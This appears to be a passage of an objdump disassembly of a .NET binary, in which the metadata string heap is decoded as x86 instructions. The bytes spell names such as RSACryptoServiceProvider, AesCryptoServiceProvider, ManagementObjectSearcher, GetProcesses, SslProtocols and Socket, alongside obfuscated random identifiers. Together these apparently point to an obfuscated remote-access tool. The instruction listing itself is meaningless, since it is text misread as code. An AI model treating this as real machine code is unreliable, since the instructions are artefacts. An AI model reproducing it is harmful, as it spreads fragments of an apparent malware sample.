  409476:	53                   	push   %ebx
  409477:	65 72 76             	gs jb  0x4094f0
  40947a:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  409481:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  409488:	41 
  409489:	43                   	inc    %ebx
  40948a:	72 79                	jb     0x409505
  40948c:	70 74                	jo     0x409502
  40948e:	6f                   	outsl  %ds:(%esi),(%dx)
  40948f:	53                   	push   %ebx
  409490:	65 72 76             	gs jb  0x409509
  409493:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40949a:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  4094a1:	73 
  4094a2:	43                   	inc    %ebx
  4094a3:	72 79                	jb     0x40951e
  4094a5:	70 74                	jo     0x40951b
  4094a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4094a8:	53                   	push   %ebx
  4094a9:	65 72 76             	gs jb  0x409522
  4094ac:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  4094b3:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  4094ba:	72 
  4094bb:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  4094c2:	64 65 72 00          	fs gs jb 0x4094c6
  4094c6:	4d                   	dec    %ebp
  4094c7:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4094ce:	74 2e                	je     0x4094fe
  4094d0:	43                   	inc    %ebx
  4094d1:	53                   	push   %ebx
  4094d2:	68 61 72 70 2e       	push   $0x2e707261
  4094d7:	52                   	push   %edx
  4094d8:	75 6e                	jne    0x409548
  4094da:	74 69                	je     0x409545
  4094dc:	6d                   	insl   (%dx),%es:(%edi)
  4094dd:	65 42                	gs inc %edx
  4094df:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  4094e6:	61                   	popa
  4094e7:	6c                   	insb   (%dx),%es:(%edi)
  4094e8:	6c                   	insb   (%dx),%es:(%edi)
  4094e9:	53                   	push   %ebx
  4094ea:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  4094f1:	65 
  4094f2:	72 00                	jb     0x4094f4
  4094f4:	67 65 74 5f          	addr16 gs je 0x409557
  4094f8:	42                   	inc    %edx
  4094f9:	75 66                	jne    0x409561
  4094fb:	66 65 72 00          	data16 gs jb 0x4094ff
  4094ff:	73 65                	jae    0x409566
  409501:	74 5f                	je     0x409562
  409503:	42                   	inc    %edx
  409504:	75 66                	jne    0x40956c
  409506:	66 65 72 00          	data16 gs jb 0x40950a
  40950a:	67 65 74 5f          	addr16 gs je 0x40956d
  40950e:	41                   	inc    %ecx
  40950f:	73 49                	jae    0x40955a
  409511:	6e                   	outsb  %ds:(%esi),(%dx)
  409512:	74 65                	je     0x409579
  409514:	67 65 72 00          	addr16 gs jb 0x409518
  409518:	73 65                	jae    0x40957f
  40951a:	74 5f                	je     0x40957b
  40951c:	41                   	inc    %ecx
  40951d:	73 49                	jae    0x409568
  40951f:	6e                   	outsb  %ds:(%esi),(%dx)
  409520:	74 65                	je     0x409587
  409522:	67 65 72 00          	addr16 gs jb 0x409526
  409526:	4d                   	dec    %ebp
  409527:	61                   	popa
  409528:	6e                   	outsb  %ds:(%esi),(%dx)
  409529:	61                   	popa
  40952a:	67 65 6d             	gs insl (%dx),%es:(%di)
  40952d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40952f:	74 4f                	je     0x409580
  409531:	62 6a 65             	bound  %ebp,0x65(%edx)
  409534:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  409538:	61                   	popa
  409539:	72 63                	jb     0x40959e
  40953b:	68 65 72 00 53       	push   $0x53007265
  409540:	65 73 73             	gs jae 0x4095b6
  409543:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40954a:	6e                   	outsb  %ds:(%esi),(%dx)
  40954b:	67 45                	addr16 inc %ebp
  40954d:	76 65                	jbe    0x4095b4
  40954f:	6e                   	outsb  %ds:(%esi),(%dx)
  409550:	74 48                	je     0x40959a
  409552:	61                   	popa
  409553:	6e                   	outsb  %ds:(%esi),(%dx)
  409554:	64 6c                	fs insb (%dx),%es:(%edi)
  409556:	65 72 00             	gs jb  0x409559
  409559:	54                   	push   %esp
  40955a:	69 6d 65 72 00 54 6f 	imul   $0x6f540072,0x65(%ebp),%ebp
  409561:	55                   	push   %ebp
  409562:	70 70                	jo     0x4095d4
  409564:	65 72 00             	gs jb  0x409567
  409567:	43                   	inc    %ebx
  409568:	75 72                	jne    0x4095dc
  40956a:	72 65                	jb     0x4095d1
  40956c:	6e                   	outsb  %ds:(%esi),(%dx)
  40956d:	74 55                	je     0x4095c4
  40956f:	73 65                	jae    0x4095d6
  409571:	72 00                	jb     0x409573
  409573:	53                   	push   %ebx
  409574:	74 72                	je     0x4095e8
  409576:	65 61                	gs popa
  409578:	6d                   	insl   (%dx),%es:(%edi)
  409579:	57                   	push   %edi
  40957a:	72 69                	jb     0x4095e5
  40957c:	74 65                	je     0x4095e3
  40957e:	72 00                	jb     0x409580
  409580:	54                   	push   %esp
  409581:	65 78 74             	gs js  0x4095f8
  409584:	57                   	push   %edi
  409585:	72 69                	jb     0x4095f0
  409587:	74 65                	je     0x4095ee
  409589:	72 00                	jb     0x40958b
  40958b:	45                   	inc    %ebp
  40958c:	6e                   	outsb  %ds:(%esi),(%dx)
  40958d:	74 65                	je     0x4095f4
  40958f:	72 00                	jb     0x409591
  409591:	42                   	inc    %edx
  409592:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  409599:	72 
  40959a:	74 65                	je     0x409601
  40959c:	72 00                	jb     0x40959e
  40959e:	54                   	push   %esp
  40959f:	6f                   	outsl  %ds:(%esi),(%dx)
  4095a0:	4c                   	dec    %esp
  4095a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4095a2:	77 65                	ja     0x409609
  4095a4:	72 00                	jb     0x4095a6
  4095a6:	75 4b                	jne    0x4095f3
  4095a8:	49                   	dec    %ecx
  4095a9:	65 4a                	gs dec %edx
  4095ab:	4c                   	dec    %esp
  4095ac:	46                   	inc    %esi
  4095ad:	55                   	push   %ebp
  4095ae:	6b 63 70 6d          	imul   $0x6d,0x70(%ebx),%esp
  4095b2:	73 67                	jae    0x40961b
  4095b4:	72 00                	jb     0x4095b6
  4095b6:	45                   	inc    %ebp
  4095b7:	67 71 72             	addr16 jno 0x40962c
  4095ba:	43                   	inc    %ebx
  4095bb:	56                   	push   %esi
  4095bc:	76 63                	jbe    0x409621
  4095be:	41                   	inc    %ecx
  4095bf:	69 72 00 49 45 6e 75 	imul   $0x756e4549,0x0(%edx),%esi
  4095c6:	6d                   	insl   (%dx),%es:(%edi)
  4095c7:	65 72 61             	gs jb  0x40962b
  4095ca:	74 6f                	je     0x40963b
  4095cc:	72 00                	jb     0x4095ce
  4095ce:	4d                   	dec    %ebp
  4095cf:	61                   	popa
  4095d0:	6e                   	outsb  %ds:(%esi),(%dx)
  4095d1:	61                   	popa
  4095d2:	67 65 6d             	gs insl (%dx),%es:(%di)
  4095d5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4095d7:	74 4f                	je     0x409628
  4095d9:	62 6a 65             	bound  %ebp,0x65(%edx)
  4095dc:	63 74 45 6e          	arpl   %esi,0x6e(%ebp,%eax,2)
  4095e0:	75 6d                	jne    0x40964f
  4095e2:	65 72 61             	gs jb  0x409646
  4095e5:	74 6f                	je     0x409656
  4095e7:	72 00                	jb     0x4095e9
  4095e9:	53                   	push   %ebx
  4095ea:	79 73                	jns    0x40965f
  4095ec:	74 65                	je     0x409653
  4095ee:	6d                   	insl   (%dx),%es:(%edi)
  4095ef:	2e 43                	cs inc %ebx
  4095f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4095f2:	6c                   	insb   (%dx),%es:(%edi)
  4095f3:	6c                   	insb   (%dx),%es:(%edi)
  4095f4:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4095f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4095fa:	73 2e                	jae    0x40962a
  4095fc:	49                   	dec    %ecx
  4095fd:	45                   	inc    %ebp
  4095fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4095ff:	75 6d                	jne    0x40966e
  409601:	65 72 61             	gs jb  0x409665
  409604:	62 6c 65 2e          	bound  %ebp,0x2e(%ebp,%eiz,2)
  409608:	47                   	inc    %edi
  409609:	65 74 45             	gs je  0x409651
  40960c:	6e                   	outsb  %ds:(%esi),(%dx)
  40960d:	75 6d                	jne    0x40967c
  40960f:	65 72 61             	gs jb  0x409673
  409612:	74 6f                	je     0x409683
  409614:	72 00                	jb     0x409616
  409616:	41                   	inc    %ecx
  409617:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  40961b:	61                   	popa
  40961c:	74 6f                	je     0x40968d
  40961e:	72 00                	jb     0x409620
  409620:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  409625:	00 2e                	add    %ch,(%esi)
  409627:	63 63 74             	arpl   %esp,0x74(%ebx)
  40962a:	6f                   	outsl  %ds:(%esi),(%dx)
  40962b:	72 00                	jb     0x40962d
  40962d:	4d                   	dec    %ebp
  40962e:	6f                   	outsl  %ds:(%esi),(%dx)
  40962f:	6e                   	outsb  %ds:(%esi),(%dx)
  409630:	69 74 6f 72 00 43 72 	imul   $0x65724300,0x72(%edi,%ebp,2),%esi
  409637:	65 
  409638:	61                   	popa
  409639:	74 65                	je     0x4096a0
  40963b:	44                   	inc    %esp
  40963c:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  409640:	70 74                	jo     0x4096b6
  409642:	6f                   	outsl  %ds:(%esi),(%dx)
  409643:	72 00                	jb     0x409645
  409645:	43                   	inc    %ebx
  409646:	72 65                	jb     0x4096ad
  409648:	61                   	popa
  409649:	74 65                	je     0x4096b0
  40964b:	45                   	inc    %ebp
  40964c:	6e                   	outsb  %ds:(%esi),(%dx)
  40964d:	63 72 79             	arpl   %esi,0x79(%edx)
  409650:	70 74                	jo     0x4096c6
  409652:	6f                   	outsl  %ds:(%esi),(%dx)
  409653:	72 00                	jb     0x409655
  409655:	58                   	pop    %eax
  409656:	45                   	inc    %ebp
  409657:	5a                   	pop    %edx
  409658:	51                   	push   %ecx
  409659:	69 44 57 77 48 4e 56 	imul   $0x71564e48,0x77(%edi,%edx,2),%eax
  409660:	71 
  409661:	72 00                	jb     0x409663
  409663:	53                   	push   %ebx
  409664:	4d                   	dec    %ebp
  409665:	43                   	inc    %ebx
  409666:	59                   	pop    %ecx
  409667:	57                   	push   %edi
  409668:	68 75 50 72 72       	push   $0x72725075
  40966d:	00 50 64             	add    %dl,0x64(%eax)
  409670:	78 75                	js     0x4096e7
  409672:	5a                   	pop    %edx
  409673:	4b                   	dec    %ebx
  409674:	44                   	inc    %esp
  409675:	66 78 58             	data16 js 0x4096d0
  409678:	72 72                	jb     0x4096ec
  40967a:	00 49 6e             	add    %cl,0x6e(%ecx)
  40967d:	74 50                	je     0x4096cf
  40967f:	74 72                	je     0x4096f3
  409681:	00 4d 54             	add    %cl,0x54(%ebp)
  409684:	79 67                	jns    0x4096ed
  409686:	5a                   	pop    %edx
  409687:	7a 65                	jp     0x4096ee
  409689:	6b 73 6e 41          	imul   $0x41,0x6e(%ebx),%esi
  40968d:	73 00                	jae    0x40968f
  40968f:	79 69                	jns    0x4096fa
  409691:	6f                   	outsl  %ds:(%esi),(%dx)
  409692:	61                   	popa
  409693:	6e                   	outsb  %ds:(%esi),(%dx)
  409694:	71 64                	jno    0x4096fa
  409696:	4a                   	dec    %edx
  409697:	6d                   	insl   (%dx),%es:(%edi)
  409698:	4b                   	dec    %ebx
  409699:	73 00                	jae    0x40969b
  40969b:	77 42                	ja     0x4096df
  40969d:	70 52                	jo     0x4096f1
  40969f:	52                   	push   %edx
  4096a0:	4d                   	dec    %ebp
  4096a1:	51                   	push   %ecx
  4096a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4096a3:	78 51                	js     0x4096f6
  4096a5:	73 00                	jae    0x4096a7
  4096a7:	5a                   	pop    %edx
  4096a8:	5a                   	pop    %edx
  4096a9:	79 75                	jns    0x409720
  4096ab:	42                   	inc    %edx
  4096ac:	48                   	dec    %eax
  4096ad:	66 71 52             	data16 jno 0x409702
  4096b0:	43                   	inc    %ebx
  4096b1:	66 57                	push   %di
  4096b3:	73 00                	jae    0x4096b5
  4096b5:	53                   	push   %ebx
  4096b6:	79 73                	jns    0x40972b
  4096b8:	74 65                	je     0x40971f
  4096ba:	6d                   	insl   (%dx),%es:(%edi)
  4096bb:	2e 44                	cs inc %esp
  4096bd:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4096c4:	69 63 73 00 4d 69 63 	imul   $0x63694d00,0x73(%ebx),%esp
  4096cb:	72 6f                	jb     0x40973c
  4096cd:	73 6f                	jae    0x40973e
  4096cf:	66 74 2e             	data16 je 0x409700
  4096d2:	56                   	push   %esi
  4096d3:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  4096da:	73 69                	jae    0x409745
  4096dc:	63 2e                	arpl   %ebp,(%esi)
  4096de:	44                   	inc    %esp
  4096df:	65 76 69             	gs jbe 0x40974b
  4096e2:	63 65 73             	arpl   %esp,0x73(%ebp)
  4096e5:	00 53 79             	add    %dl,0x79(%ebx)
  4096e8:	73 74                	jae    0x40975e
  4096ea:	65 6d                	gs insl (%dx),%es:(%edi)
  4096ec:	2e 52                	cs push %edx
  4096ee:	75 6e                	jne    0x40975e
  4096f0:	74 69                	je     0x40975b
  4096f2:	6d                   	insl   (%dx),%es:(%edi)
  4096f3:	65 2e 49             	gs cs dec %ecx
  4096f6:	6e                   	outsb  %ds:(%esi),(%dx)
  4096f7:	74 65                	je     0x40975e
  4096f9:	72 6f                	jb     0x40976a
  4096fb:	70 53                	jo     0x409750
  4096fd:	65 72 76             	gs jb  0x409776
  409700:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  409707:	73 74                	jae    0x40977d
  409709:	65 6d                	gs insl (%dx),%es:(%edi)
  40970b:	2e 52                	cs push %edx
  40970d:	75 6e                	jne    0x40977d
  40970f:	74 69                	je     0x40977a
  409711:	6d                   	insl   (%dx),%es:(%edi)
  409712:	65 2e 43             	gs cs inc %ebx
  409715:	6f                   	outsl  %ds:(%esi),(%dx)
  409716:	6d                   	insl   (%dx),%es:(%edi)
  409717:	70 69                	jo     0x409782
  409719:	6c                   	insb   (%dx),%es:(%edi)
  40971a:	65 72 53             	gs jb  0x409770
  40971d:	65 72 76             	gs jb  0x409796
  409720:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  409727:	62 75 67             	bound  %esi,0x67(%ebp)
  40972a:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  409731:	65 
  409732:	73 00                	jae    0x409734
  409734:	45                   	inc    %ebp
  409735:	78 70                	js     0x4097a7
  409737:	61                   	popa
  409738:	6e                   	outsb  %ds:(%esi),(%dx)
  409739:	64 45                	fs inc %ebp
  40973b:	6e                   	outsb  %ds:(%esi),(%dx)
  40973c:	76 69                	jbe    0x4097a7
  40973e:	72 6f                	jb     0x4097af
  409740:	6e                   	outsb  %ds:(%esi),(%dx)
  409741:	6d                   	insl   (%dx),%es:(%edi)
  409742:	65 6e                	outsb  %gs:(%esi),(%dx)
  409744:	74 56                	je     0x40979c
  409746:	61                   	popa
  409747:	72 69                	jb     0x4097b2
  409749:	61                   	popa
  40974a:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  40974e:	00 47 65             	add    %al,0x65(%edi)
  409751:	74 50                	je     0x4097a3
  409753:	72 6f                	jb     0x4097c4
  409755:	63 65 73             	arpl   %esp,0x73(%ebp)
  409758:	73 65                	jae    0x4097bf
  40975a:	73 00                	jae    0x40975c
  40975c:	47                   	inc    %edi
  40975d:	65 74 48             	gs je  0x4097a8
  409760:	6f                   	outsl  %ds:(%esi),(%dx)
  409761:	73 74                	jae    0x4097d7
  409763:	41                   	inc    %ecx
  409764:	64 64 72 65          	fs fs jb 0x4097cd
  409768:	73 73                	jae    0x4097dd
  40976a:	65 73 00             	gs jae 0x40976d
  40976d:	53                   	push   %ebx
  40976e:	79 73                	jns    0x4097e3
  409770:	74 65                	je     0x4097d7
  409772:	6d                   	insl   (%dx),%es:(%edi)
  409773:	2e 53                	cs push %ebx
  409775:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409779:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409780:	70 
  409781:	74 6f                	je     0x4097f2
  409783:	67 72 61             	addr16 jb 0x4097e7
  409786:	70 68                	jo     0x4097f0
  409788:	79 2e                	jns    0x4097b8
  40978a:	58                   	pop    %eax
  40978b:	35 30 39 43 65       	xor    $0x65433930,%eax
  409790:	72 74                	jb     0x409806
  409792:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  409799:	73 00                	jae    0x40979b
  40979b:	52                   	push   %edx
  40979c:	66 63 32             	arpl   %si,(%edx)
  40979f:	38 39                	cmp    %bh,(%ecx)
  4097a1:	38 44 65 72          	cmp    %al,0x72(%ebp,%eiz,2)
  4097a5:	69 76 65 42 79 74 65 	imul   $0x65747942,0x65(%esi),%esi
  4097ac:	73 00                	jae    0x4097ae
  4097ae:	52                   	push   %edx
  4097af:	65 61                	gs popa
  4097b1:	64 41                	fs inc %ecx
  4097b3:	6c                   	insb   (%dx),%es:(%edi)
  4097b4:	6c                   	insb   (%dx),%es:(%edi)
  4097b5:	42                   	inc    %edx
  4097b6:	79 74                	jns    0x40982c
  4097b8:	65 73 00             	gs jae 0x4097bb
  4097bb:	47                   	inc    %edi
  4097bc:	65 74 42             	gs je  0x409801
  4097bf:	79 74                	jns    0x409835
  4097c1:	65 73 00             	gs jae 0x4097c4
  4097c4:	43                   	inc    %ebx
  4097c5:	53                   	push   %ebx
  4097c6:	68 61 72 70 41       	push   $0x41707261
  4097cb:	72 67                	jb     0x409834
  4097cd:	75 6d                	jne    0x40983c
  4097cf:	65 6e                	outsb  %gs:(%esi),(%dx)
  4097d1:	74 49                	je     0x40981c
  4097d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4097d4:	66 6f                	outsw  %ds:(%esi),(%dx)
  4097d6:	46                   	inc    %esi
  4097d7:	6c                   	insb   (%dx),%es:(%edi)
  4097d8:	61                   	popa
  4097d9:	67 73 00             	addr16 jae 0x4097dc
  4097dc:	43                   	inc    %ebx
  4097dd:	53                   	push   %ebx
  4097de:	68 61 72 70 42       	push   $0x42707261
  4097e3:	69 6e 64 65 72 46 6c 	imul   $0x6c467265,0x64(%esi),%ebp
  4097ea:	61                   	popa
  4097eb:	67 73 00             	addr16 jae 0x4097ee
  4097ee:	53                   	push   %ebx
  4097ef:	74 72                	je     0x409863
  4097f1:	69 6e 67 73 00 53 65 	imul   $0x65530073,0x67(%esi),%ebp
  4097f8:	73 73                	jae    0x40986d
  4097fa:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  409801:	6e                   	outsb  %ds:(%esi),(%dx)
  409802:	67 45                	addr16 inc %ebp
  409804:	76 65                	jbe    0x40986b
  409806:	6e                   	outsb  %ds:(%esi),(%dx)
  409807:	74 41                	je     0x40984a
  409809:	72 67                	jb     0x409872
  40980b:	73 00                	jae    0x40980d
  40980d:	49                   	dec    %ecx
  40980e:	43                   	inc    %ebx
  40980f:	72 65                	jb     0x409876
  409811:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409814:	74 69                	je     0x40987f
  409816:	61                   	popa
  409817:	6c                   	insb   (%dx),%es:(%edi)
  409818:	73 00                	jae    0x40981a
  40981a:	73 65                	jae    0x409881
  40981c:	74 5f                	je     0x40987d
  40981e:	43                   	inc    %ebx
  40981f:	72 65                	jb     0x409886
  409821:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409824:	74 69                	je     0x40988f
  409826:	61                   	popa
  409827:	6c                   	insb   (%dx),%es:(%edi)
  409828:	73 00                	jae    0x40982a
  40982a:	45                   	inc    %ebp
  40982b:	71 75                	jno    0x4098a2
  40982d:	61                   	popa
  40982e:	6c                   	insb   (%dx),%es:(%edi)
  40982f:	73 00                	jae    0x409831
  409831:	53                   	push   %ebx
  409832:	73 6c                	jae    0x4098a0
  409834:	50                   	push   %eax
  409835:	72 6f                	jb     0x4098a6
  409837:	74 6f                	je     0x4098a8
  409839:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  40983c:	73 00                	jae    0x40983e
  40983e:	55                   	push   %ebp
  40983f:	49                   	dec    %ecx
  409840:	75 57                	jne    0x409899
  409842:	57                   	push   %edi
  409843:	68 49 6a 58 52       	push   $0x52586a49
  409848:	66 74 6c             	data16 je 0x4098b7
  40984b:	73 00                	jae    0x40984d
  40984d:	53                   	push   %ebx
  40984e:	79 73                	jns    0x4098c3
  409850:	74 65                	je     0x4098b7
  409852:	6d                   	insl   (%dx),%es:(%edi)
  409853:	2e 57                	cs push %edi
  409855:	69 6e 64 6f 77 73 2e 	imul   $0x2e73776f,0x64(%esi),%ebp
  40985c:	46                   	inc    %esi
  40985d:	6f                   	outsl  %ds:(%esi),(%dx)
  40985e:	72 6d                	jb     0x4098cd
  409860:	73 00                	jae    0x409862
  409862:	44                   	inc    %esp
  409863:	6e                   	outsb  %ds:(%esi),(%dx)
  409864:	73 00                	jae    0x409866
  409866:	43                   	inc    %ebx
  409867:	6f                   	outsl  %ds:(%esi),(%dx)
  409868:	6e                   	outsb  %ds:(%esi),(%dx)
  409869:	74 61                	je     0x4098cc
  40986b:	69 6e 73 00 53 79 73 	imul   $0x73795300,0x73(%esi),%ebp
  409872:	74 65                	je     0x4098d9
  409874:	6d                   	insl   (%dx),%es:(%edi)
  409875:	2e 43                	cs inc %ebx
  409877:	6f                   	outsl  %ds:(%esi),(%dx)
  409878:	6c                   	insb   (%dx),%es:(%edi)
  409879:	6c                   	insb   (%dx),%es:(%edi)
  40987a:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40987f:	6e                   	outsb  %ds:(%esi),(%dx)
  409880:	73 00                	jae    0x409882
  409882:	53                   	push   %ebx
  409883:	74 72                	je     0x4098f7
  409885:	69 6e 67 53 70 6c 69 	imul   $0x696c7053,0x67(%esi),%ebp
  40988c:	74 4f                	je     0x4098dd
  40988e:	70 74                	jo     0x409904
  409890:	69 6f 6e 73 00 47 65 	imul   $0x65470073,0x6e(%edi),%ebp
  409897:	74 49                	je     0x4098e2
  409899:	6d                   	insl   (%dx),%es:(%edi)
  40989a:	61                   	popa
  40989b:	67 65 44             	addr16 gs inc %esp
  40989e:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  4098a2:	65 72 73             	gs jb  0x409918
  4098a5:	00 52 75             	add    %dl,0x75(%edx)
  4098a8:	6e                   	outsb  %ds:(%esi),(%dx)
  4098a9:	74 69                	je     0x409914
  4098ab:	6d                   	insl   (%dx),%es:(%edi)
  4098ac:	65 48                	gs dec %eax
  4098ae:	65 6c                	gs insb (%dx),%es:(%edi)
  4098b0:	70 65                	jo     0x409917
  4098b2:	72 73                	jb     0x409927
  4098b4:	00 53 73             	add    %dl,0x73(%ebx)
  4098b7:	6c                   	insb   (%dx),%es:(%edi)
  4098b8:	50                   	push   %eax
  4098b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4098ba:	6c                   	insb   (%dx),%es:(%edi)
  4098bb:	69 63 79 45 72 72 6f 	imul   $0x6f727245,0x79(%ebx),%esp
  4098c2:	72 73                	jb     0x409937
  4098c4:	00 46 69             	add    %al,0x69(%esi)
  4098c7:	6c                   	insb   (%dx),%es:(%edi)
  4098c8:	65 41                	gs inc %ecx
  4098ca:	63 63 65             	arpl   %esp,0x65(%ebx)
  4098cd:	73 73                	jae    0x409942
  4098cf:	00 47 65             	add    %al,0x65(%edi)
  4098d2:	74 43                	je     0x409917
  4098d4:	75 72                	jne    0x409948
  4098d6:	72 65                	jb     0x40993d
  4098d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4098d9:	74 50                	je     0x40992b
  4098db:	72 6f                	jb     0x40994c
  4098dd:	63 65 73             	arpl   %esp,0x73(%ebp)
  4098e0:	73 00                	jae    0x4098e2
  4098e2:	49                   	dec    %ecx
  4098e3:	50                   	push   %eax
  4098e4:	41                   	inc    %ecx
  4098e5:	64 64 72 65          	fs fs jb 0x40994e
  4098e9:	73 73                	jae    0x40995e
  4098eb:	00 53 79             	add    %dl,0x79(%ebx)
  4098ee:	73 74                	jae    0x409964
  4098f0:	65 6d                	gs insl (%dx),%es:(%edi)
  4098f2:	2e 4e                	cs dec %esi
  4098f4:	65 74 2e             	gs je  0x409925
  4098f7:	53                   	push   %ebx
  4098f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4098f9:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4098fc:	74 73                	je     0x409971
  4098fe:	00 73 65             	add    %dh,0x65(%ebx)
  409901:	74 5f                	je     0x409962
  409903:	41                   	inc    %ecx
  409904:	72 67                	jb     0x40996d
  409906:	75 6d                	jne    0x409975
  409908:	65 6e                	outsb  %gs:(%esi),(%dx)
  40990a:	74 73                	je     0x40997f
  40990c:	00 53 79             	add    %dl,0x79(%ebx)
  40990f:	73 74                	jae    0x409985
  409911:	65 6d                	gs insl (%dx),%es:(%edi)
  409913:	45                   	inc    %ebp
  409914:	76 65                	jbe    0x40997b
  409916:	6e                   	outsb  %ds:(%esi),(%dx)
  409917:	74 73                	je     0x40998c
  409919:	00 45 78             	add    %al,0x78(%ebp)
  40991c:	69 73 74 73 00 47 68 	imul   $0x68470073,0x74(%ebx),%esi
  409923:	54                   	push   %esp
  409924:	58                   	pop    %eax
  409925:	71 49                	jno    0x409970
  409927:	41                   	inc    %ecx
  409928:	62 4d 76             	bound  %ecx,0x76(%ebp)
  40992b:	6f                   	outsl  %ds:(%esi),(%dx)
  40992c:	71 57                	jno    0x409985
  40992e:	57                   	push   %edi
  40992f:	4b                   	dec    %ebx
  409930:	74 00                	je     0x409932
  409932:	70 52                	jo     0x409986
  409934:	62 4d 59             	bound  %ecx,0x59(%ebp)
  409937:	6b 69 48 56          	imul   $0x56,0x48(%ecx),%ebp
  40993b:	74 00                	je     0x40993d
  40993d:	43                   	inc    %ebx
  40993e:	6f                   	outsl  %ds:(%esi),(%dx)
  40993f:	6e                   	outsb  %ds:(%esi),(%dx)
  409940:	63 61 74             	arpl   %esp,0x74(%ecx)
  409943:	00 49 6d             	add    %cl,0x6d(%ecx)
  409946:	61                   	popa
  409947:	67 65 46             	addr16 gs inc %esi
  40994a:	6f                   	outsl  %ds:(%esi),(%dx)
  40994b:	72 6d                	jb     0x4099ba
  40994d:	61                   	popa
  40994e:	74 00                	je     0x409950
  409950:	67 65 74 5f          	addr16 gs je 0x4099b3
  409954:	41                   	inc    %ecx
  409955:	73 46                	jae    0x40999d
  409957:	6c                   	insb   (%dx),%es:(%edi)
  409958:	6f                   	outsl  %ds:(%esi),(%dx)
  409959:	61                   	popa
  40995a:	74 00                	je     0x40995c
  40995c:	73 65                	jae    0x4099c3
  40995e:	74 5f                	je     0x4099bf
  409960:	41                   	inc    %ecx
  409961:	73 46                	jae    0x4099a9
  409963:	6c                   	insb   (%dx),%es:(%edi)
  409964:	6f                   	outsl  %ds:(%esi),(%dx)
  409965:	61                   	popa
  409966:	74 00                	je     0x409968
  409968:	4d                   	dec    %ebp
  409969:	61                   	popa
  40996a:	6e                   	outsb  %ds:(%esi),(%dx)
  40996b:	61                   	popa
  40996c:	67 65 6d             	gs insl (%dx),%es:(%di)
  40996f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409971:	74 42                	je     0x4099b5
  409973:	61                   	popa
  409974:	73 65                	jae    0x4099db
  409976:	4f                   	dec    %edi
  409977:	62 6a 65             	bound  %ebp,0x65(%edx)
  40997a:	63 74 00 43          	arpl   %esi,0x43(%eax,%eax,1)
  40997e:	6f                   	outsl  %ds:(%esi),(%dx)
  40997f:	6c                   	insb   (%dx),%es:(%edi)
  409980:	6c                   	insb   (%dx),%es:(%edi)
  409981:	65 63 74 00 43       	arpl   %esi,%gs:0x43(%eax,%eax,1)
  409986:	6f                   	outsl  %ds:(%esi),(%dx)
  409987:	6e                   	outsb  %ds:(%esi),(%dx)
  409988:	6e                   	outsb  %ds:(%esi),(%dx)
  409989:	65 63 74 00 47       	arpl   %esi,%gs:0x47(%eax,%eax,1)
  40998e:	65 74 00             	gs je  0x409991
  409991:	53                   	push   %ebx
  409992:	79 73                	jns    0x409a07
  409994:	74 65                	je     0x4099fb
  409996:	6d                   	insl   (%dx),%es:(%edi)
  409997:	2e 4e                	cs dec %esi
  409999:	65 74 00             	gs je  0x40999c
  40999c:	54                   	push   %esp
  40999d:	61                   	popa
  40999e:	72 67                	jb     0x409a07
  4099a0:	65 74 00             	gs je  0x4099a3
  4099a3:	53                   	push   %ebx
  4099a4:	6f                   	outsl  %ds:(%esi),(%dx)
  4099a5:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4099a8:	74 00                	je     0x4099aa
  4099aa:	53                   	push   %ebx
  4099ab:	79 73                	jns    0x409a20
  4099ad:	74 65                	je     0x409a14
  4099af:	6d                   	insl   (%dx),%es:(%edi)
  4099b0:	2e 43                	cs inc %ebx
